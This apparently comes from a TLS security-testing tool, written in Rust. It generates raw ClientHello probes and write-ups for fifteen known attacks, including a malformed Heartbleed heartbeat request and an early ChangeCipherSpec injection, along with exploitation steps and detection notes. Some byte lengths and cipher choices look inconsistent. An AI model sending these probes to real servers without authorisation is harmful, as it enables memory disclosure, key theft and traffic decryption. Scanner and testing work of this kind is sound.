use std::fmt;

/// TLS attack technique classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TlsAttackType {
    /// BEAST: CBC IV chaining exploit (TLS 1.0).
    Beast,
    /// POODLE: SSLv3 padding oracle on downgraded legacy connections.
    Poodle,
    /// Heartbleed: OpenSSL heartbeat extension memory disclosure.
    Heartbleed,
    /// ROBOT: Bleichenbacher oracle on RSA PKCS#1 v1.5 key exchange.
    Robot,
    /// DROWN: SSLv2 cross-protocol attack on RSA keys shared with TLS.
    Drown,
    /// Version downgrade: force negotiation to weaker protocol version.
    VersionDowngrade,
    /// CRIME: TLS compression side-channel for secret extraction.
    Crime,
    /// BREACH: HTTP compression side-channel (response body).
    Breach,
    /// LUCKY13: CBC timing side-channel in TLS record processing.
    Lucky13,
    /// SWEET32: Birthday attack on 64-bit block ciphers (3DES/Blowfish).
    Sweet32,
    /// Logjam: DHE export-grade downgrade (512-bit DH).
    Logjam,
    /// FREAK: RSA export-grade downgrade (512-bit RSA).
    Freak,
    /// Renegotiation: client-initiated renegotiation for prefix injection.
    Renegotiation,
    /// Ticket bleed: session ticket memory disclosure.
    TicketBleed,
    /// CCS injection: ChangeCipherSpec before key exchange.
    CcsInjection,
}

impl fmt::Display for TlsAttackType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Beast => write!(f, "BEAST"),
            Self::Poodle => write!(f, "POODLE"),
            Self::Heartbleed => write!(f, "Heartbleed"),
            Self::Robot => write!(f, "ROBOT"),
            Self::Drown => write!(f, "DROWN"),
            Self::VersionDowngrade => write!(f, "Version Downgrade"),
            Self::Crime => write!(f, "CRIME"),
            Self::Breach => write!(f, "BREACH"),
            Self::Lucky13 => write!(f, "LUCKY13"),
            Self::Sweet32 => write!(f, "SWEET32"),
            Self::Logjam => write!(f, "Logjam"),
            Self::Freak => write!(f, "FREAK"),
            Self::Renegotiation => write!(f, "Renegotiation"),
            Self::TicketBleed => write!(f, "Ticket Bleed"),
            Self::CcsInjection => write!(f, "CCS Injection"),
        }
    }
}

/// TLS protocol version for downgrade targeting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum TlsProtoVersion {
    Ssl20,
    Ssl30,
    Tls10,
    Tls11,
    Tls12,
    Tls13,
}

impl TlsProtoVersion {
    pub fn wire_bytes(&self) -> [u8; 2] {
        match self {
            Self::Ssl20 => [0x00, 0x02],
            Self::Ssl30 => [0x03, 0x00],
            Self::Tls10 => [0x03, 0x01],
            Self::Tls11 => [0x03, 0x02],
            Self::Tls12 => [0x03, 0x03],
            Self::Tls13 => [0x03, 0x04],
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Ssl20 => "SSLv2",
            Self::Ssl30 => "SSLv3",
            Self::Tls10 => "TLS 1.0",
            Self::Tls11 => "TLS 1.1",
            Self::Tls12 => "TLS 1.2",
            Self::Tls13 => "TLS 1.3",
        }
    }

    pub fn all() -> &'static [TlsProtoVersion] {
        &[
            Self::Ssl20,
            Self::Ssl30,
            Self::Tls10,
            Self::Tls11,
            Self::Tls12,
            Self::Tls13,
        ]
    }
}

impl fmt::Display for TlsProtoVersion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.name())
    }
}

/// Cipher suite classification for attack targeting.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VulnerableCipherSuite {
    pub name: String,
    pub id: [u8; 2],
    pub vulnerable_to: Vec<TlsAttackType>,
    pub key_exchange: KeyExchange,
    pub encryption: Encryption,
}

/// Key exchange algorithm.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeyExchange {
    RsaPkcs1,
    RsaExport,
    DheRsa,
    DheExport,
    EcdhEcdsa,
    EcdheRsa,
    EcdheEcdsa,
    Psk,
    Null,
}

/// Symmetric encryption algorithm.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Encryption {
    Aes128Cbc,
    Aes256Cbc,
    Aes128Gcm,
    Aes256Gcm,
    Des3Cbc,
    Rc4,
    DesCbc,
    ChaCha20Poly1305,
    Null,
}

/// A generated TLS attack probe payload.
#[derive(Debug, Clone)]
pub struct TlsAttackPayload {
    pub attack_type: TlsAttackType,
    pub target_version: Option<TlsProtoVersion>,
    pub client_hello_bytes: Vec<u8>,
    pub description: String,
    pub cve_ids: Vec<String>,
    pub detection_notes: String,
    pub prerequisites: Vec<String>,
}

/// CVE mapping for known TLS vulnerabilities.
fn cve_ids_for(attack: TlsAttackType) -> Vec<String> {
    match attack {
        TlsAttackType::Beast => vec!["CVE-2011-3389".into()],
        TlsAttackType::Poodle => vec!["CVE-2014-3566".into()],
        TlsAttackType::Heartbleed => vec!["CVE-2014-0160".into()],
        TlsAttackType::Robot => vec!["CVE-2017-13099".into()],
        TlsAttackType::Drown => vec!["CVE-2016-0800".into()],
        TlsAttackType::Crime => vec!["CVE-2012-4929".into()],
        TlsAttackType::Breach => vec!["CVE-2013-3587".into()],
        TlsAttackType::Lucky13 => vec!["CVE-2013-0169".into()],
        TlsAttackType::Sweet32 => vec!["CVE-2016-2183".into(), "CVE-2016-6329".into()],
        TlsAttackType::Logjam => vec!["CVE-2015-4000".into()],
        TlsAttackType::Freak => vec!["CVE-2015-0204".into()],
        TlsAttackType::Renegotiation => vec!["CVE-2009-3555".into()],
        TlsAttackType::TicketBleed => vec!["CVE-2016-9244".into()],
        TlsAttackType::CcsInjection => vec!["CVE-2014-0224".into()],
        TlsAttackType::VersionDowngrade => vec![],
    }
}

/// Build a minimal TLS ClientHello for the given version and cipher suites.
fn build_client_hello(
    version: TlsProtoVersion,
    cipher_suite_ids: &[[u8; 2]],
    sni: &str,
) -> Vec<u8> {
    let mut hello = Vec::with_capacity(256);

    // Record header: ContentType=Handshake(22)
    hello.push(0x16);
    hello.extend_from_slice(&version.wire_bytes());
    // Placeholder for record length (2 bytes) — filled later
    let record_len_pos = hello.len();
    hello.extend_from_slice(&[0x00, 0x00]);

    // Handshake header: type=ClientHello(1)
    hello.push(0x01);
    // Placeholder for handshake length (3 bytes)
    let hs_len_pos = hello.len();
    hello.extend_from_slice(&[0x00, 0x00, 0x00]);

    let hs_body_start = hello.len();

    // Client version
    hello.extend_from_slice(&version.wire_bytes());

    // Random (32 bytes of zeros — probe, not real handshake)
    hello.extend_from_slice(&[0x00; 32]);

    // Session ID length = 0
    hello.push(0x00);

    // Cipher suites
    let cs_len = (cipher_suite_ids.len() * 2) as u16;
    hello.extend_from_slice(&cs_len.to_be_bytes());
    for cs in cipher_suite_ids {
        hello.extend_from_slice(cs);
    }

    // Compression methods: null(0)
    hello.push(0x01);
    hello.push(0x00);

    // Extensions: SNI
    let sni_bytes = sni.as_bytes();
    let sni_list_len = (sni_bytes.len() + 3) as u16;
    let sni_ext_len = sni_list_len + 2;
    let extensions_len = sni_ext_len + 4;

    hello.extend_from_slice(&extensions_len.to_be_bytes());
    // SNI extension type = 0x0000
    hello.extend_from_slice(&[0x00, 0x00]);
    hello.extend_from_slice(&sni_ext_len.to_be_bytes());
    hello.extend_from_slice(&sni_list_len.to_be_bytes());
    hello.push(0x00); // host_name type
    hello.extend_from_slice(&(sni_bytes.len() as u16).to_be_bytes());
    hello.extend_from_slice(sni_bytes);

    // Patch lengths
    let hs_body_len = hello.len() - hs_body_start;
    hello[hs_len_pos] = ((hs_body_len >> 16) & 0xff) as u8;
    hello[hs_len_pos + 1] = ((hs_body_len >> 8) & 0xff) as u8;
    hello[hs_len_pos + 2] = (hs_body_len & 0xff) as u8;

    let record_len = hello.len() - record_len_pos - 2;
    hello[record_len_pos] = ((record_len >> 8) & 0xff) as u8;
    hello[record_len_pos + 1] = (record_len & 0xff) as u8;

    hello
}

/// Build a Heartbeat request (for Heartbleed probing).
fn build_heartbeat_request(version: TlsProtoVersion) -> Vec<u8> {
    let mut pkt = Vec::with_capacity(32);

    // ContentType = Heartbeat (24)
    pkt.push(0x18);
    pkt.extend_from_slice(&version.wire_bytes());

    // Record length
    pkt.extend_from_slice(&[0x00, 0x03]);

    // HeartbeatMessageType = request (1)
    pkt.push(0x01);
    // Payload length = 16384 (claimed, but actual payload is empty → memory leak)
    pkt.extend_from_slice(&[0x40, 0x00]);

    pkt
}

/// TLS attack payload generator.
#[derive(Debug)]
pub struct TlsAttackGenerator {
    target_host: String,
    target_port: u16,
}

impl Default for TlsAttackGenerator {
    fn default() -> Self {
        Self::new("localhost".to_string(), 443)
    }
}

impl TlsAttackGenerator {
    pub fn new(target_host: String, target_port: u16) -> Self {
        Self {
            target_host,
            target_port,
        }
    }

    /// Generate BEAST attack probe (TLS 1.0 CBC).
    pub fn beast_probe(&self) -> TlsAttackPayload {
        let ciphers = [
            [0x00, 0x2F], // TLS_RSA_WITH_AES_128_CBC_SHA
            [0x00, 0x35], // TLS_RSA_WITH_AES_256_CBC_SHA
            [0x00, 0x0A], // TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Beast,
            target_version: Some(TlsProtoVersion::Tls10),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls10,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "BEAST probe: TLS 1.0 ClientHello with CBC-only suites → {}:{}. \
                 If server negotiates TLS 1.0 + CBC, IV chaining allows chosen-plaintext \
                 block boundary attack against session cookies",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Beast),
            detection_notes: "Low risk — standard ClientHello, server must downgrade to TLS 1.0"
                .into(),
            prerequisites: vec![
                "Server supports TLS 1.0".into(),
                "Server negotiates CBC cipher suite".into(),
                "Attacker can inject known plaintext adjacent to secret".into(),
            ],
        }
    }

    /// Generate POODLE attack probe (SSLv3 CBC padding oracle).
    pub fn poodle_probe(&self) -> TlsAttackPayload {
        let ciphers = [
            [0x00, 0x2F], // TLS_RSA_WITH_AES_128_CBC_SHA
            [0x00, 0x0A], // TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Poodle,
            target_version: Some(TlsProtoVersion::Ssl30),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Ssl30,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "POODLE probe: SSLv3 ClientHello to {}:{}. SSLv3 MAC-then-encrypt with \
                 non-deterministic padding → padding oracle leaks 1 byte per 256 requests. \
                 Combine with TLS_FALLBACK_SCSV check",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Poodle),
            detection_notes: "SSLv3 ClientHello is anomalous on modern networks".into(),
            prerequisites: vec![
                "Server supports SSLv3".into(),
                "No TLS_FALLBACK_SCSV enforcement".into(),
            ],
        }
    }

    /// Generate Heartbleed memory disclosure probe.
    pub fn heartbleed_probe(&self) -> TlsAttackPayload {
        let ciphers = [[0x00, 0x2F]]; // AES-128-CBC
        let mut bytes = build_client_hello(TlsProtoVersion::Tls12, &ciphers, &self.target_host);
        bytes.extend_from_slice(&build_heartbeat_request(TlsProtoVersion::Tls12));

        TlsAttackPayload {
            attack_type: TlsAttackType::Heartbleed,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: bytes,
            description: format!(
                "Heartbleed probe: TLS 1.2 ClientHello + malformed Heartbeat request \
                 (claimed payload=16384, actual=0) to {}:{}. Vulnerable OpenSSL (1.0.1-1.0.1f) \
                 returns up to 64KB of process memory including private keys and session data",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Heartbleed),
            detection_notes:
                "Heartbeat extension in ClientHello is distinctive, IDS signatures exist".into(),
            prerequisites: vec![
                "OpenSSL 1.0.1 through 1.0.1f".into(),
                "Heartbeat extension enabled".into(),
            ],
        }
    }

    /// Generate ROBOT oracle probe (Bleichenbacher RSA PKCS#1).
    pub fn robot_probe(&self) -> TlsAttackPayload {
        let rsa_ciphers = [
            [0x00, 0x2F], // TLS_RSA_WITH_AES_128_CBC_SHA
            [0x00, 0x35], // TLS_RSA_WITH_AES_256_CBC_SHA
            [0x00, 0x3C], // TLS_RSA_WITH_AES_128_CBC_SHA256
            [0x00, 0x3D], // TLS_RSA_WITH_AES_256_CBC_SHA256
            [0x00, 0x9C], // TLS_RSA_WITH_AES_128_GCM_SHA256
            [0x00, 0x9D], // TLS_RSA_WITH_AES_256_GCM_SHA384
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Robot,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &rsa_ciphers,
                &self.target_host,
            ),
            description: format!(
                "ROBOT probe: TLS 1.2 ClientHello with RSA key-exchange suites to {}:{}. \
                 After negotiation, send crafted ClientKeyExchange with malformed PKCS#1 v1.5 \
                 padding. Timing/error differences reveal Bleichenbacher oracle → decrypt \
                 premaster secret in ~10k-100k queries",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Robot),
            detection_notes:
                "Initial ClientHello is normal; oracle probing via repeated ClientKeyExchange"
                    .into(),
            prerequisites: vec![
                "Server supports RSA key exchange (not ECDHE)".into(),
                "Implementation leaks PKCS#1 padding errors".into(),
            ],
        }
    }

    /// Generate DROWN cross-protocol attack probe.
    pub fn drown_probe(&self) -> TlsAttackPayload {
        // SSLv2 ClientHello format differs (2-byte header)
        let mut bytes = Vec::with_capacity(64);
        // SSLv2 record: msg_type=1 (ClientHello), version=0x0002
        bytes.push(0x80); // 2-byte header, no padding
        bytes.push(0x2E); // length placeholder
        bytes.push(0x01); // ClientHello
        bytes.extend_from_slice(&[0x00, 0x02]); // SSLv2
                                                // Cipher specs length
        bytes.extend_from_slice(&[0x00, 0x15]);
        // Session ID length
        bytes.extend_from_slice(&[0x00, 0x00]);
        // Challenge length
        bytes.extend_from_slice(&[0x00, 0x10]);
        // SSLv2 cipher specs (export + full): 7 specs × 3 bytes
        let ssl2_ciphers: &[[u8; 3]] = &[
            [0x01, 0x00, 0x80], // SSL_CK_RC4_128_WITH_MD5
            [0x02, 0x00, 0x80], // SSL_CK_RC4_128_EXPORT40_WITH_MD5
            [0x03, 0x00, 0x80], // SSL_CK_RC2_128_CBC_WITH_MD5
            [0x04, 0x00, 0x80], // SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5
            [0x05, 0x00, 0x80], // SSL_CK_IDEA_128_CBC_WITH_MD5
            [0x06, 0x00, 0x40], // SSL_CK_DES_64_CBC_WITH_MD5
            [0x07, 0x00, 0xC0], // SSL_CK_DES_192_EDE3_CBC_WITH_MD5
        ];
        for cs in ssl2_ciphers {
            bytes.extend_from_slice(cs);
        }
        // Challenge (16 bytes of zeros)
        bytes.extend_from_slice(&[0x00; 16]);

        TlsAttackPayload {
            attack_type: TlsAttackType::Drown,
            target_version: Some(TlsProtoVersion::Ssl20),
            client_hello_bytes: bytes,
            description: format!(
                "DROWN probe: SSLv2 ClientHello to {}:{}. If server supports SSLv2 and \
                 shares RSA key with TLS service, Bleichenbacher-style oracle on SSLv2 \
                 can decrypt TLS 1.2 sessions. Check for shared RSA modulus across ports",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Drown),
            detection_notes:
                "SSLv2 traffic is extremely anomalous; any SSLv2 ClientHello is suspicious".into(),
            prerequisites: vec![
                "Server supports SSLv2 on any port".into(),
                "RSA key shared between SSLv2 and TLS endpoints".into(),
            ],
        }
    }

    /// Generate version downgrade probes for all legacy versions.
    pub fn version_downgrade_probes(&self) -> Vec<TlsAttackPayload> {
        let targets = [
            (TlsProtoVersion::Ssl30, "SSLv3"),
            (TlsProtoVersion::Tls10, "TLS 1.0"),
            (TlsProtoVersion::Tls11, "TLS 1.1"),
        ];
        let fallback_scsv = [0x56, 0x00]; // TLS_FALLBACK_SCSV

        targets
            .iter()
            .map(|(version, name)| {
                let ciphers = [[0x00, 0x2F], [0x00, 0x35], fallback_scsv];
                TlsAttackPayload {
                    attack_type: TlsAttackType::VersionDowngrade,
                    target_version: Some(*version),
                    client_hello_bytes: build_client_hello(*version, &ciphers, &self.target_host),
                    description: format!(
                        "Version downgrade probe: {name} ClientHello with FALLBACK_SCSV to {}:{}. \
                         If server responds with ServerHello (not inappropriate_fallback alert), \
                         downgrade attacks are possible",
                        self.target_host, self.target_port
                    ),
                    cve_ids: vec![],
                    detection_notes: format!(
                        "{name} ClientHello is suspicious from modern clients"
                    ),
                    prerequisites: vec![
                        format!("Server accepts {name} connections"),
                        "No FALLBACK_SCSV enforcement".into(),
                    ],
                }
            })
            .collect()
    }

    /// Generate CRIME compression probe.
    pub fn crime_probe(&self) -> TlsAttackPayload {
        let ciphers = [[0x00, 0x2F]];
        TlsAttackPayload {
            attack_type: TlsAttackType::Crime,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "CRIME probe: check TLS compression support on {}:{}. If server negotiates \
                 DEFLATE compression (method=1), attacker can extract secrets by observing \
                 compressed ciphertext length changes with chosen-plaintext injection",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Crime),
            detection_notes:
                "Normal ClientHello; detection requires checking negotiated compression".into(),
            prerequisites: vec![
                "Server supports TLS-level DEFLATE compression".into(),
                "Attacker can inject known text into encrypted stream".into(),
            ],
        }
    }

    /// Generate BREACH HTTP compression probe.
    pub fn breach_probe(&self) -> TlsAttackPayload {
        TlsAttackPayload {
            attack_type: TlsAttackType::Breach,
            target_version: None,
            client_hello_bytes: vec![],
            description: format!(
                "BREACH probe: HTTP-level compression oracle on {}:{}. Send requests with \
                 crafted prefix/suffix matching CSRF tokens in response body. Measure \
                 Content-Length differences. ~30 requests per byte of secret. \
                 Check: Accept-Encoding: gzip,deflate → compressed response with reflected input",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Breach),
            detection_notes: "HTTP-level attack; no TLS anomalies; looks like normal web traffic"
                .into(),
            prerequisites: vec![
                "HTTP compression enabled (gzip/deflate)".into(),
                "Response body reflects user input".into(),
                "Response body contains a secret (CSRF token, etc.)".into(),
            ],
        }
    }

    /// Generate LUCKY13 timing probe.
    pub fn lucky13_probe(&self) -> TlsAttackPayload {
        let ciphers = [
            [0x00, 0x2F], // AES-128-CBC
            [0x00, 0x35], // AES-256-CBC
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Lucky13,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "LUCKY13 probe: TLS 1.2 CBC suites to {}:{}. Send records with crafted \
                 padding lengths and measure timing differences in MAC verification. \
                 Difference of ~2μs between valid and invalid padding reveals plaintext \
                 bytes. Requires ~2^23 sessions per byte",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Lucky13),
            detection_notes:
                "Requires precise timing measurements; high volume of failed handshakes".into(),
            prerequisites: vec![
                "Server supports CBC cipher suites".into(),
                "Non-constant-time MAC verification".into(),
                "Low-latency network path for timing accuracy".into(),
            ],
        }
    }

    /// Generate SWEET32 birthday attack probe.
    pub fn sweet32_probe(&self) -> TlsAttackPayload {
        let ciphers = [
            [0x00, 0x0A], // TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Sweet32,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "SWEET32 probe: TLS 1.2 with 3DES-only suites to {}:{}. Birthday attack on \
                 64-bit block cipher: after ~2^32 blocks (~32GB), XOR of two ciphertext blocks \
                 equals XOR of plaintexts. Keep-alive connection with sustained traffic required",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Sweet32),
            detection_notes:
                "3DES-only ClientHello is unusual; prolonged single connection is suspicious".into(),
            prerequisites: vec![
                "Server negotiates 3DES or Blowfish".into(),
                "Long-lived connection with ~32GB of data".into(),
            ],
        }
    }

    /// Generate Logjam DHE downgrade probe.
    pub fn logjam_probe(&self) -> TlsAttackPayload {
        let dhe_export_ciphers = [
            [0x00, 0x03], // TLS_RSA_EXPORT_WITH_RC4_40_MD5
            [0x00, 0x06], // TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
            [0x00, 0x08], // TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
            [0x00, 0x14], // TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Logjam,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &dhe_export_ciphers,
                &self.target_host,
            ),
            description: format!(
                "Logjam probe: export DHE suites to {}:{}. If server negotiates DHE_EXPORT \
                 (512-bit DH), precompute discrete log for common primes. MITM: downgrade \
                 to export → solve DH → forge ServerKeyExchange. Also check DH params < 1024 bits",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Logjam),
            detection_notes: "Export cipher suites in ClientHello are anomalous".into(),
            prerequisites: vec![
                "Server supports DHE_EXPORT cipher suites".into(),
                "Or uses DH parameters < 1024 bits".into(),
            ],
        }
    }

    /// Generate FREAK RSA export downgrade probe.
    pub fn freak_probe(&self) -> TlsAttackPayload {
        let rsa_export_ciphers = [
            [0x00, 0x03], // TLS_RSA_EXPORT_WITH_RC4_40_MD5
            [0x00, 0x06], // TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
            [0x00, 0x08], // TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
        ];
        TlsAttackPayload {
            attack_type: TlsAttackType::Freak,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &rsa_export_ciphers,
                &self.target_host,
            ),
            description: format!(
                "FREAK probe: RSA export suites to {}:{}. If server accepts, MITM can request \
                 512-bit RSA export key → factor in ~7 hours on EC2 → forge ServerKeyExchange \
                 signature → impersonate server",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Freak),
            detection_notes: "Export suites are obsolete; presence in ClientHello is a red flag"
                .into(),
            prerequisites: vec!["Server supports RSA_EXPORT cipher suites".into()],
        }
    }

    /// Generate TLS renegotiation probe.
    pub fn renegotiation_probe(&self) -> TlsAttackPayload {
        let ciphers = [[0x00, 0x2F]];
        TlsAttackPayload {
            attack_type: TlsAttackType::Renegotiation,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "Renegotiation probe: establish TLS to {}:{}, then initiate client renegotiation. \
                 If server allows without renegotiation_info extension (RFC 5746), attacker \
                 can prefix-inject plaintext into authenticated stream. Check for \
                 TLS_EMPTY_RENEGOTIATION_INFO_SCSV (0x00FF) in ServerHello",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::Renegotiation),
            detection_notes: "Renegotiation attempt after established session is detectable".into(),
            prerequisites: vec![
                "Server allows client-initiated renegotiation".into(),
                "No renegotiation_info extension".into(),
            ],
        }
    }

    /// Generate Ticket Bleed probe.
    pub fn ticket_bleed_probe(&self) -> TlsAttackPayload {
        let ciphers = [[0x00, 0x2F]];
        TlsAttackPayload {
            attack_type: TlsAttackType::TicketBleed,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: build_client_hello(
                TlsProtoVersion::Tls12,
                &ciphers,
                &self.target_host,
            ),
            description: format!(
                "Ticket Bleed probe: request session ticket from {}:{}, then resume with \
                 1-byte session ID. Vulnerable F5 BIG-IP leaks 31 bytes of uninitialized \
                 memory in session ID field. Repeat to harvest session ticket encryption key",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::TicketBleed),
            detection_notes: "Unusual 1-byte session ID in resumed handshake".into(),
            prerequisites: vec!["F5 BIG-IP with session tickets enabled".into()],
        }
    }

    /// Generate CCS Injection probe.
    pub fn ccs_injection_probe(&self) -> TlsAttackPayload {
        let ciphers = [[0x00, 0x2F]];
        let mut bytes = build_client_hello(TlsProtoVersion::Tls12, &ciphers, &self.target_host);
        // Append early CCS message: ContentType=ChangeCipherSpec(20), payload=0x01
        bytes.push(0x14); // ContentType
        bytes.extend_from_slice(&TlsProtoVersion::Tls12.wire_bytes());
        bytes.extend_from_slice(&[0x00, 0x01]); // length
        bytes.push(0x01); // CCS message

        TlsAttackPayload {
            attack_type: TlsAttackType::CcsInjection,
            target_version: Some(TlsProtoVersion::Tls12),
            client_hello_bytes: bytes,
            description: format!(
                "CCS Injection probe: send ChangeCipherSpec before key exchange to {}:{}. \
                 Vulnerable OpenSSL (pre-0.9.8za, 1.0.0m, 1.0.1h) accepts early CCS, \
                 causing use of zero-length master secret → MITM can decrypt all traffic",
                self.target_host, self.target_port
            ),
            cve_ids: cve_ids_for(TlsAttackType::CcsInjection),
            detection_notes: "Early CCS is protocol violation; easy to detect".into(),
            prerequisites: vec!["OpenSSL before 0.9.8za / 1.0.0m / 1.0.1h".into()],
        }
    }

    /// Generate a comprehensive suite of all TLS attack probes.
    pub fn generate_full_suite(&self) -> Vec<TlsAttackPayload> {
        let mut payloads = vec![
            self.beast_probe(),
            self.poodle_probe(),
            self.heartbleed_probe(),
            self.robot_probe(),
            self.drown_probe(),
            self.crime_probe(),
            self.breach_probe(),
            self.lucky13_probe(),
            self.sweet32_probe(),
            self.logjam_probe(),
            self.freak_probe(),
            self.renegotiation_probe(),
            self.ticket_bleed_probe(),
            self.ccs_injection_probe(),
        ];
        payloads.extend(self.version_downgrade_probes());
        payloads
    }

    /// List all vulnerable cipher suites with their associated attacks.
    pub fn vulnerable_cipher_suites() -> Vec<VulnerableCipherSuite> {
        vec![
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_AES_128_CBC_SHA".into(),
                id: [0x00, 0x2F],
                vulnerable_to: vec![
                    TlsAttackType::Beast,
                    TlsAttackType::Lucky13,
                    TlsAttackType::Robot,
                ],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Aes128Cbc,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_AES_256_CBC_SHA".into(),
                id: [0x00, 0x35],
                vulnerable_to: vec![
                    TlsAttackType::Beast,
                    TlsAttackType::Lucky13,
                    TlsAttackType::Robot,
                ],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Aes256Cbc,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_3DES_EDE_CBC_SHA".into(),
                id: [0x00, 0x0A],
                vulnerable_to: vec![
                    TlsAttackType::Beast,
                    TlsAttackType::Sweet32,
                    TlsAttackType::Lucky13,
                ],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Des3Cbc,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_RC4_128_SHA".into(),
                id: [0x00, 0x05],
                vulnerable_to: vec![TlsAttackType::Robot],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Rc4,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_AES_128_GCM_SHA256".into(),
                id: [0x00, 0x9C],
                vulnerable_to: vec![TlsAttackType::Robot],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Aes128Gcm,
            },
            VulnerableCipherSuite {
                name: "TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA".into(),
                id: [0x00, 0x14],
                vulnerable_to: vec![TlsAttackType::Logjam],
                key_exchange: KeyExchange::DheExport,
                encryption: Encryption::DesCbc,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_EXPORT_WITH_RC4_40_MD5".into(),
                id: [0x00, 0x03],
                vulnerable_to: vec![TlsAttackType::Freak],
                key_exchange: KeyExchange::RsaExport,
                encryption: Encryption::Rc4,
            },
            VulnerableCipherSuite {
                name: "TLS_RSA_WITH_NULL_SHA".into(),
                id: [0x00, 0x02],
                vulnerable_to: vec![],
                key_exchange: KeyExchange::RsaPkcs1,
                encryption: Encryption::Null,
            },
        ]
    }
}
